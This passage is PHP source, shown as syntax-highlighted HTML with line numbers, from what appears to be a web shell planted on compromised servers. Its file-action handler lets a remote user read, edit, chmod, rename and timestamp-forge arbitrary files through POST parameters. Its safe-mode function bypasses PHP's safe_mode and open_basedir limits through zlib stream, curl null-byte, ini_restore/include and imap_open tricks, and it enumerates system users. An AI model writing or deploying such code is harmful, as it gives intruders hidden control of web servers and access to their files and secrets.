<span class="lineno"> 745</span>         <span class="nv">$m</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;View&#39;</span><span class="p">,</span> <span class="s1">&#39;Highlight&#39;</span><span class="p">,</span> <span class="s1">&#39;Download&#39;</span><span class="p">,</span> <span class="s1">&#39;Hexdump&#39;</span><span class="p">,</span> <span class="s1">&#39;Edit&#39;</span><span class="p">,</span> <span class="s1">&#39;Chmod&#39;</span><span class="p">,</span> <span class="s1">&#39;Rename&#39;</span><span class="p">,</span> <span class="s1">&#39;Touch&#39;</span><span class="p">);</span> 
<span class="lineno"> 746</span>     <span class="k">else</span> 
<span class="lineno"> 747</span>         <span class="nv">$m</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Chmod&#39;</span><span class="p">,</span> <span class="s1">&#39;Rename&#39;</span><span class="p">,</span> <span class="s1">&#39;Touch&#39;</span><span class="p">);</span> 
<span class="lineno"> 748</span>     <span class="k">foreach</span><span class="p">(</span><span class="nv">$m</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> 
<span class="lineno"> 749</span>         <span class="k">echo</span> <span class="s1">&#39;&lt;a href=# onclick=&quot;g(null,null,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;\&#39;)&quot;&gt;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">==@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span><span class="o">?</span><span class="s1">&#39;&lt;b&gt;[ &#39;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s1">&#39; ]&lt;/b&gt;&#39;</span><span class="o">:</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/a&gt; &#39;</span><span class="p">;</span> 
<span class="lineno"> 750</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 751</span>     <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="p">{</span> 
<span class="lineno"> 752</span>         <span class="k">case</span> <span class="s1">&#39;view&#39;</span><span class="o">:</span> 
<span class="lineno"> 753</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;pre class=ml1&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 754</span>             <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span> 
<span class="lineno"> 755</span>             <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 756</span>                 <span class="k">while</span><span class="p">(</span> <span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">)</span> 
<span class="lineno"> 757</span>                     <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">));</span> 
<span class="lineno"> 758</span>                 <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span> 
<span class="lineno"> 759</span>             <span class="p">}</span> 
<span class="lineno"> 760</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 761</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 762</span>         <span class="k">case</span> <span class="s1">&#39;highlight&#39;</span><span class="o">:</span> 
<span class="lineno"> 763</span>             <span class="k">if</span><span class="p">(</span> <span class="nb">is_readable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 764</span>                 <span class="k">echo</span> <span class="s1">&#39;&lt;div class=ml1 style=&quot;background-color: #e1e1e1;color:black;&quot;&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 765</span>                 <span class="nv">$code</span> <span class="o">=</span> <span class="nb">highlight_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="k">true</span><span class="p">);</span> 
<span class="lineno"> 766</span>                 <span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;&lt;span &#39;</span><span class="p">,</span><span class="s1">&#39;&lt;/span&gt;&#39;</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&lt;font &#39;</span><span class="p">,</span><span class="s1">&#39;&lt;/font&gt;&#39;</span><span class="p">),</span><span class="nv">$code</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 767</span>             <span class="p">}</span> 
<span class="lineno"> 768</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 769</span>         <span class="k">case</span> <span class="s1">&#39;chmod&#39;</span><span class="o">:</span> 
<span class="lineno"> 770</span>             <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 771</span>                 <span class="nv">$perms</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
<span class="lineno"> 772</span>                 <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span><span class="nv">$i</span><span class="o">&gt;=</span><span class="mi">0</span><span class="p">;</span><span class="o">--</span><span class="nv">$i</span><span class="p">)</span> 
<span class="lineno"> 773</span>                     <span class="nv">$perms</span> <span class="o">+=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span><span class="o">*</span><span class="nb">pow</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">-</span><span class="nv">$i</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span> 
<span class="lineno"> 774</span>                 <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$perms</span><span class="p">))</span> 
<span class="lineno"> 775</span>                     <span class="k">echo</span> <span class="s1">&#39;Can\&#39;t set permissions!&lt;br&gt;&lt;script&gt;document.mf.p3.value=&quot;&quot;;&lt;/script&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 776</span>                 <span class="k">else</span> 
<span class="lineno"> 777</span>                     <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&lt;script&gt;g(null,null,null,null,&quot;&quot;)&lt;/script&gt;&#39;</span><span class="p">);</span> 
<span class="lineno"> 778</span>             <span class="p">}</span> 
<span class="lineno"> 779</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;form onsubmit=&quot;g(null,null,null,null,this.chmod.value);return false;&quot;&gt;&lt;input type=text name=chmod value=&quot;&#39;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%o&#39;</span><span class="p">,</span> <span class="nb">fileperms</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])),</span><span class="o">-</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 780</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 781</span>         <span class="k">case</span> <span class="s1">&#39;edit&#39;</span><span class="o">:</span> 
<span class="lineno"> 782</span>             <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span> 
<span class="lineno"> 783</span>                 <span class="k">echo</span> <span class="s1">&#39;File isn\&#39;t writeable&#39;</span><span class="p">;</span> 
<span class="lineno"> 784</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 785</span>             <span class="p">}</span> 
<span class="lineno"> 786</span>             <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 787</span>                 <span class="o">@</span><span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]);</span> 
<span class="lineno"> 788</span>                 <span class="k">echo</span> <span class="s1">&#39;Saved!&lt;br&gt;&lt;script&gt;document.mf.p3.value=&quot;&quot;;&lt;/script&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 789</span>             <span class="p">}</span> 
<span class="lineno"> 790</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;form onsubmit=&quot;g(null,null,null,null,this.text.value);return false;&quot;&gt;&lt;textarea name=text class=bigarea&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 791</span>             <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span> 
<span class="lineno"> 792</span>             <span class="k">if</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 793</span>                 <span class="k">while</span><span class="p">(</span> <span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">)</span> 
<span class="lineno"> 794</span>                     <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">));</span> 
<span class="lineno"> 795</span>                 <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span> 
<span class="lineno"> 796</span>             <span class="p">}</span> 
<span class="lineno"> 797</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;/textarea&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 798</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 799</span>         <span class="k">case</span> <span class="s1">&#39;hexdump&#39;</span><span class="o">:</span> 
<span class="lineno"> 800</span>             <span class="nv">$c</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span> 
<span class="lineno"> 801</span>             <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
<span class="lineno"> 802</span>             <span class="nv">$h</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;00000000&lt;br&gt;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span> 
<span class="lineno"> 803</span>             <span class="nv">$len</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span> 
<span class="lineno"> 804</span>             <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$len</span><span class="p">;</span> <span class="o">++</span><span class="nv">$i</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 805</span>                 <span class="nv">$h</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%02X&#39;</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39; &#39;</span><span class="p">;</span> 
<span class="lineno"> 806</span>                 <span class="k">switch</span> <span class="p">(</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 807</span>                     <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>  <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 808</span>                     <span class="k">case</span> <span class="mi">9</span><span class="o">:</span>  <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 809</span>                     <span class="k">case</span> <span class="mi">10</span><span class="o">:</span> <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 810</span>                     <span class="k">case</span> <span class="mi">13</span><span class="o">:</span> <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 811</span>                     <span class="k">default</span><span class="o">:</span> <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="nv">$c</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span> <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 812</span>                 <span class="p">}</span> 
<span class="lineno"> 813</span>                 <span class="nv">$n</span><span class="o">++</span><span class="p">;</span> 
<span class="lineno"> 814</span>                 <span class="k">if</span> <span class="p">(</span><span class="nv">$n</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 815</span>                     <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
<span class="lineno"> 816</span>                     <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">)</span> <span class="p">{</span><span class="nv">$h</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%08X&#39;</span><span class="p">,</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;}</span> 
<span class="lineno"> 817</span>                     <span class="nv">$h</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 818</span>                     <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 819</span>                 <span class="p">}</span> 
<span class="lineno"> 820</span>              <span class="p">}</span> 
<span class="lineno"> 821</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;table cellspacing=1 cellpadding=5 bgcolor=#222222&gt;&lt;tr&gt;&lt;td bgcolor=#333333&gt;&lt;span style=&quot;font-weight: normal;&quot;&gt;&lt;pre&gt;&#39;</span><span class="o">.</span><span class="nv">$h</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&lt;/span&gt;&lt;/td&gt;&lt;td bgcolor=#282828&gt;&lt;pre&gt;&#39;</span><span class="o">.</span><span class="nv">$h</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&lt;/td&gt;&lt;td bgcolor=#333333&gt;&lt;pre&gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 822</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 823</span>         <span class="k">case</span> <span class="s1">&#39;rename&#39;</span><span class="o">:</span> 
<span class="lineno"> 824</span>             <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 825</span>                 <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">rename</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]))</span> 
<span class="lineno"> 826</span>                     <span class="k">echo</span> <span class="s1">&#39;Can\&#39;t rename!&lt;br&gt;&lt;script&gt;document.mf.p3.value=&quot;&quot;;&lt;/script&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 827</span>                 <span class="k">else</span> 
<span class="lineno"> 828</span>                     <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&lt;script&gt;g(null,null,&quot;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;,null,&quot;&quot;)&lt;/script&gt;&#39;</span><span class="p">);</span> 
<span class="lineno"> 829</span>             <span class="p">}</span> 
<span class="lineno"> 830</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;form onsubmit=&quot;g(null,null,null,null,this.name.value);return false;&quot;&gt;&lt;input type=text name=name value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 831</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 832</span>         <span class="k">case</span> <span class="s1">&#39;touch&#39;</span><span class="o">:</span> 
<span class="lineno"> 833</span>             <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 834</span>                 <span class="nv">$time</span> <span class="o">=</span> <span class="nb">strtotime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]);</span> 
<span class="lineno"> 835</span>                 <span class="k">if</span><span class="p">(</span><span class="nv">$time</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 836</span>                     <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">touch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="nv">$time</span><span class="p">,</span><span class="nv">$time</span><span class="p">))</span> 
<span class="lineno"> 837</span>                         <span class="k">die</span><span class="p">(</span><span class="s1">&#39;&lt;script&gt;g(null,null,null,null,&quot;&quot;)&lt;/script&gt;&#39;</span><span class="p">);</span> 
<span class="lineno"> 838</span>                     <span class="k">else</span> <span class="p">{</span> 
<span class="lineno"> 839</span>                         <span class="k">echo</span> <span class="s1">&#39;Fail!&lt;script&gt;document.mf.p3.value=&quot;&quot;;&lt;/script&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 840</span>                     <span class="p">}</span> 
<span class="lineno"> 841</span>                 <span class="p">}</span> <span class="k">else</span> <span class="k">echo</span> <span class="s1">&#39;Bad time format!&lt;script&gt;document.mf.p3.value=&quot;&quot;;&lt;/script&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 842</span>             <span class="p">}</span> 
<span class="lineno"> 843</span>             <span class="k">echo</span> <span class="s1">&#39;&lt;form onsubmit=&quot;g(null,null,null,null,this.touch.value);return false;&quot;&gt;&lt;input type=text name=touch value=&quot;&#39;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;Y-m-d H:i:s&quot;</span><span class="p">,</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span><span class="o">.</span><span class="s1">&#39;&quot;&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 844</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 845</span>         <span class="k">case</span> <span class="s1">&#39;mkfile&#39;</span><span class="o">:</span> 
<span class="lineno"> 846</span>              
<span class="lineno"> 847</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 848</span>     <span class="p">}</span> 
<span class="lineno"> 849</span>     <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 850</span>     <span class="nx">printFooter</span><span class="p">();</span> 
<span class="lineno"> 851</span> <span class="p">}</span> 
<span class="lineno"> 852</span> 
<span class="lineno"> 853</span> <span class="k">function</span> <span class="nf">actionSafeMode</span><span class="p">()</span> <span class="p">{</span> 
<span class="lineno"> 854</span>     <span class="nv">$temp</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span> 
<span class="lineno"> 855</span>     <span class="nb">ob_start</span><span class="p">();</span> 
<span class="lineno"> 856</span>     <span class="k">switch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="p">{</span> 
<span class="lineno"> 857</span>         <span class="k">case</span> <span class="mi">1</span><span class="o">:</span> 
<span class="lineno"> 858</span>             <span class="nv">$temp</span><span class="o">=@</span><span class="nb">tempnam</span><span class="p">(</span><span class="nv">$test</span><span class="p">,</span> <span class="s1">&#39;cx&#39;</span><span class="p">);</span> 
<span class="lineno"> 859</span>             <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="s2">&quot;compress.zlib://&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">],</span> <span class="nv">$temp</span><span class="p">)){</span> 
<span class="lineno"> 860</span>                 <span class="k">echo</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span> 
<span class="lineno"> 861</span>                 <span class="nb">unlink</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span> 
<span class="lineno"> 862</span>             <span class="p">}</span> <span class="k">else</span> 
<span class="lineno"> 863</span>                 <span class="k">echo</span> <span class="s1">&#39;Sorry... Can\&#39;t open file&#39;</span><span class="p">;</span> 
<span class="lineno"> 864</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 865</span>         <span class="k">case</span> <span class="mi">2</span><span class="o">:</span> 
<span class="lineno"> 866</span>             <span class="nv">$files</span> <span class="o">=</span> <span class="nb">glob</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;*&#39;</span><span class="p">);</span> 
<span class="lineno"> 867</span>             <span class="k">if</span><span class="p">(</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$files</span><span class="p">)</span> <span class="p">)</span> 
<span class="lineno"> 868</span>                 <span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$filename</span><span class="p">)</span> 
<span class="lineno"> 869</span>                     <span class="k">echo</span> <span class="nv">$filename</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 870</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 871</span>         <span class="k">case</span> <span class="mi">3</span><span class="o">:</span> 
<span class="lineno"> 872</span>             <span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">(</span><span class="s2">&quot;file://&quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">SELF_PATH</span><span class="p">);</span> 
<span class="lineno"> 873</span>             <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span> 
<span class="lineno"> 874</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 875</span>         <span class="k">case</span> <span class="mi">4</span><span class="o">:</span> 
<span class="lineno"> 876</span>             <span class="nb">ini_restore</span><span class="p">(</span><span class="s2">&quot;safe_mode&quot;</span><span class="p">);</span> 
<span class="lineno"> 877</span>             <span class="nb">ini_restore</span><span class="p">(</span><span class="s2">&quot;open_basedir&quot;</span><span class="p">);</span> 
<span class="lineno"> 878</span>             <span class="k">include</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span> 
<span class="lineno"> 879</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 880</span>         <span class="k">case</span> <span class="mi">5</span><span class="o">:</span> 
<span class="lineno"> 881</span>             <span class="k">for</span><span class="p">(;</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">];</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
<span class="lineno"> 882</span>                 <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span> 
<span class="lineno"> 883</span>                 <span class="k">if</span> <span class="p">(</span><span class="nv">$uid</span><span class="p">)</span> 
<span class="lineno"> 884</span>                     <span class="k">echo</span> <span class="nb">join</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="nv">$uid</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> 
<span class="lineno"> 885</span>             <span class="p">}</span> 
<span class="lineno"> 886</span>             <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 887</span>         <span class="k">case</span> <span class="mi">6</span><span class="o">:</span> 
<span class="lineno"> 888</span>             <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;imap_open&#39;</span><span class="p">))</span><span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 889</span>             <span class="nv">$stream</span> <span class="o">=</span> <span class="nb">imap_open</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">],</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">);</span> 
<span class="lineno"> 890</span>             <span class="k">if</span> <span class="p">(</span><span class="nv">$stream</span> <span class="o">==</span> <span class="k">FALSE</span><span class="p">)</span> 
<span class="lineno"> 891</span>                 <span class="k">break</span><span class="p">;</span> 
<span class="lineno"> 892</span>             <span class="k">echo</span> <span class="nb">imap_body</span><span class="p">(</span><span class="nv">$stream</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> 
<span class="lineno"> 893</span>             <span class="nb">imap_close</span><span class="p">(</span><span class="nv">$stream</span><span class="p">);</span> 
<span class="lineno"> 894</span>             <span class="k">break</span><span class="p">;</span> 
